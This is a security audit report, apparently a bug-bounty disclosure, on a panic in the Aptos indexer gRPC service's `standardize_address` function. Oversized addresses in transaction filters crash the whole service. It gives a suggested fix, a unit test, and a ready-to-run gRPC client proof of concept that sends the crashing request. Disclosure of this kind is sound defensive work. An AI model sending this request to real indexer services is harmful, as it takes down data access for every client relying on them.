# Audit Report

## Title
Indexer gRPC Service Denial of Service via Unchecked Address Length in Transaction Filters

## Summary
The `standardize_address` function in the indexer transaction filter system lacks input validation for address string length, causing a panic when processing addresses longer than 64 hexadecimal characters. An unprivileged attacker can crash the entire indexer gRPC service by sending a single malicious `GetTransactionsRequest` with an oversized address in the transaction filter. [1](#0-0) 

## Finding Description
The vulnerability exists in the `standardize_address` function which performs address normalization without validating input length. When an address string (after removing the "0x" prefix) exceeds 64 characters, the function attempts to compute a negative slice range, triggering an integer underflow panic.

**Attack Flow**:

1. **Entry Point**: Attacker sends gRPC `GetTransactionsRequest` with a `transaction_filter` containing an address field (e.g., `EntryFunctionFilter.address`, `UserTransactionFilter.sender`, or `MoveStructTagFilter.address`) set to a string longer than 64 hex characters. [2](#0-1) 

2. **Deserialization**: The protobuf message is deserialized without validation. Address fields are accepted as arbitrary strings. [3](#0-2) 

3. **Filter Parsing**: The service calls `parse_transaction_filter` to convert the protobuf filter into internal representation. [4](#0-3) 

4. **Type Conversion**: During conversion from protobuf to internal filter types, the `From` implementation eagerly evaluates `standardize_address` inside `OnceCell::with_value`. [5](#0-4) 

5. **Panic Trigger**: When `trimmed.len() > 64`, the expression `64 - trimmed.len()` underflows, causing a panic at the slice indexing operation.

6. **Service Termination**: The panic handler catches the panic and terminates the entire indexer gRPC service process. [6](#0-5) 

**Affected Components**:
- Historical Data Service
- Live Data Service  
- Localnet Data Service

All three services process transaction filters using the same vulnerable code path. [7](#0-6) 

## Impact Explanation
This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria due to "API crashes". The indexer gRPC service is a critical API component that provides blockchain data access to applications, wallets, and infrastructure.

**Impact Scope**:
- **Complete service outage**: Single malicious request crashes entire indexer gRPC process
- **No authentication required**: Any client can send gRPC requests without credentials
- **Affects all clients**: All applications relying on the indexer API lose data access
- **Operational disruption**: Requires manual service restart and potential investigation

**Important Note**: This does NOT affect consensus nodes or blockchain operation. The indexer services are auxiliary infrastructure for data querying, not part of the core consensus protocol. Therefore, this is classified as an API crash (High) rather than loss of network liveness (Critical).

## Likelihood Explanation
**Likelihood: Very High**

- **Trivial exploitation**: Attack requires only crafting a simple gRPC message with a long string
- **No special permissions**: Any unauthenticated client can send requests
- **Reliable crash**: The vulnerability triggers deterministically every time
- **Multiple attack vectors**: Three different address fields can trigger the crash (EntryFunctionFilter.address, UserTransactionFilter.sender, MoveStructTagFilter.address)
- **No rate limiting mentioned**: No evidence of request filtering that would prevent this attack

An attacker could automate repeated crashes to maintain persistent denial of service.

## Recommendation
**Immediate Fix**: Add input validation to `standardize_address` to reject addresses exceeding the maximum valid length:

```rust
pub fn standardize_address(address: &str) -> Result<String, String> {
    // Remove "0x" prefix if it exists
    let trimmed = address.strip_prefix("0x").unwrap_or(address);
    
    // Validate length (Aptos addresses are 32 bytes = 64 hex chars)
    if trimmed.len() > 64 {
        return Err(format!("Address too long: {} characters (max 64)", trimmed.len()));
    }
    
    // Validate hex characters
    if !trimmed.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err("Address contains non-hexadecimal characters".to_string());
    }
    
    // Check if the address is a special address...
    // (rest of existing logic)
}
```

**Additional Validations**:
1. Update `From` implementations to handle validation errors
2. Add validation in protobuf deserialization layer
3. Implement request-level input sanitization before filter parsing
4. Add length limits to protobuf string fields in the schema

**Defense in Depth**:
- Add panic catching around filter parsing to return errors instead of crashing
- Implement request rate limiting
- Add monitoring for repeated filter parsing failures

## Proof of Concept

```rust
#[cfg(test)]
mod test_dos_vulnerability {
    use super::*;
    use aptos_protos::indexer::v1::{
        EntryFunctionFilter, UserTransactionFilter, BooleanTransactionFilter,
        ApiFilter, api_filter,
    };
    use aptos_transaction_filter::BooleanTransactionFilter as InternalFilter;

    #[test]
    #[should_panic(expected = "attempt to subtract with overflow")]
    fn test_oversized_address_causes_panic() {
        // Create a malicious address string > 64 chars
        let malicious_address = "0x".to_string() + &"a".repeat(100);
        
        // Create a filter with the oversized address
        let proto_filter = aptos_protos::indexer::v1::BooleanTransactionFilter {
            filter: Some(
                aptos_protos::indexer::v1::boolean_transaction_filter::Filter::ApiFilter(
                    ApiFilter {
                        filter: Some(api_filter::Filter::UserTransactionFilter(
                            UserTransactionFilter {
                                sender: Some(malicious_address),
                                payload_filter: None,
                            }
                        ))
                    }
                )
            )
        };
        
        // This will panic during conversion
        let _ = InternalFilter::new_from_proto(proto_filter, Some(10000));
    }
    
    #[test]
    fn test_valid_address_succeeds() {
        // Valid address should work fine
        let valid_address = "0x1";
        
        let proto_filter = aptos_protos::indexer::v1::BooleanTransactionFilter {
            filter: Some(
                aptos_protos::indexer::v1::boolean_transaction_filter::Filter::ApiFilter(
                    ApiFilter {
                        filter: Some(api_filter::Filter::UserTransactionFilter(
                            UserTransactionFilter {
                                sender: Some(valid_address.to_string()),
                                payload_filter: None,
                            }
                        ))
                    }
                )
            )
        };
        
        // This should succeed
        let result = InternalFilter::new_from_proto(proto_filter, Some(10000));
        assert!(result.is_ok());
    }
}
```

**gRPC Client PoC**:
```rust
// Minimal gRPC client to trigger the crash
use aptos_protos::indexer::v1::{
    raw_data_client::RawDataClient, GetTransactionsRequest,
    BooleanTransactionFilter, UserTransactionFilter, ApiFilter, api_filter,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = RawDataClient::connect("http://indexer-grpc-url:50051").await?;
    
    // Craft malicious filter with oversized address
    let malicious_filter = BooleanTransactionFilter {
        filter: Some(
            aptos_protos::indexer::v1::boolean_transaction_filter::Filter::ApiFilter(
                ApiFilter {
                    filter: Some(api_filter::Filter::UserTransactionFilter(
                        UserTransactionFilter {
                            sender: Some("0x".to_string() + &"f".repeat(100)),
                            payload_filter: None,
                        }
                    ))
                }
            )
        )
    };
    
    let request = GetTransactionsRequest {
        starting_version: Some(0),
        transactions_count: None,
        batch_size: None,
        transaction_filter: Some(malicious_filter),
    };
    
    // Send request - this will crash the server
    let response = client.get_transactions(request).await;
    println!("Response: {:?}", response);
    
    Ok(())
}
```

## Notes
This vulnerability affects the indexer infrastructure layer, not the core blockchain consensus. While this is a serious operational issue causing service disruption, it does not compromise blockchain integrity, consensus safety, or user funds. The severity is rated as **High** due to API crash impact rather than Critical, as it does not affect core network liveness.

### Citations

**File:** ecosystem/indexer-grpc/transaction-filter/src/utils.rs (L10-36)
```rust
pub fn standardize_address(address: &str) -> String {
    // Remove "0x" prefix if it exists
    let trimmed = address.strip_prefix("0x").unwrap_or(address);

    // Check if the address is a special address by seeing if the first 31 bytes are zero and the last byte is smaller than 0b10000
    if let Some(last_char) = trimmed.chars().last() {
        if trimmed[..trimmed.len().saturating_sub(1)]
            .chars()
            .all(|c| c == '0')
            && last_char.is_ascii_hexdigit()
            && last_char <= 'f'
        {
            // Return special addresses in short format
            let mut result = String::with_capacity(3);
            result.push_str("0x");
            result.push(last_char);
            return result;
        }
    }

    // Return non-special addresses in long format
    let mut result = String::with_capacity(66);
    result.push_str("0x");
    result.push_str(&ZEROS[..64 - trimmed.len()]);
    result.push_str(trimmed);
    result
}
```

**File:** protos/proto/aptos/indexer/v1/filter.proto (L23-27)
```text
message EntryFunctionFilter {
  optional string address = 1;
  optional string module_name  = 2;
  optional string function = 3;
}
```

**File:** protos/rust/src/pb/aptos.indexer.v1.serde.rs (L531-535)
```rust
                        GeneratedField::Address => {
                            if address__.is_some() {
                                return Err(serde::de::Error::duplicate_field("address"));
                            }
                            address__ = map.next_value()?;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/filter_utils.rs (L9-15)
```rust
pub fn parse_transaction_filter(
    proto_filter: aptos_protos::indexer::v1::BooleanTransactionFilter,
    max_filter_size_bytes: usize,
) -> Result<BooleanTransactionFilter, Status> {
    BooleanTransactionFilter::new_from_proto(proto_filter, Some(max_filter_size_bytes))
        .map_err(|e| Status::invalid_argument(format!("Invalid transaction_filter: {e:?}.")))
}
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/filters/user_transaction.rs (L155-169)
```rust
impl From<aptos_protos::indexer::v1::EntryFunctionFilter> for EntryFunctionFilter {
    fn from(proto_filter: aptos_protos::indexer::v1::EntryFunctionFilter) -> Self {
        Self {
            standardized_address: OnceCell::with_value(
                proto_filter
                    .address
                    .as_ref()
                    .map(|address| standardize_address(address)),
            ),
            address: proto_filter.address,
            module: proto_filter.module_name,
            function: proto_filter.function,
        }
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L149-168)
```rust
pub fn setup_panic_handler() {
    std::panic::set_hook(Box::new(move |pi: &PanicHookInfo<'_>| {
        handle_panic(pi);
    }));
}

// Formats and logs panic information
fn handle_panic(panic_info: &PanicHookInfo<'_>) {
    // The Display formatter for a PanicHookInfo contains the message, payload and location.
    let details = format!("{}", panic_info);
    let backtrace = format!("{:#?}", Backtrace::new());
    let info = CrashInfo { details, backtrace };
    let crash_info = toml::to_string_pretty(&info).unwrap();
    error!("{}", crash_info);
    // TODO / HACK ALARM: Write crash info synchronously via eprintln! to ensure it is written before the process exits which error! doesn't guarantee.
    // This is a workaround until https://github.com/aptos-labs/aptos-core/issues/2038 is resolved.
    eprintln!("{}", crash_info);
    // Kill the process
    process::exit(12);
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L83-100)
```rust
                let filter = if let Some(proto_filter) = request.transaction_filter {
                    match filter_utils::parse_transaction_filter(
                        proto_filter,
                        self.max_transaction_filter_size_bytes,
                    ) {
                        Ok(filter) => Some(filter),
                        Err(err) => {
                            info!("Client error: {err:?}.");
                            let _ = response_sender.blocking_send(Err(err));
                            COUNTER
                                .with_label_values(&["historical_data_service_invalid_filter"])
                                .inc();
                            continue;
                        },
                    }
                } else {
                    None
                };
```
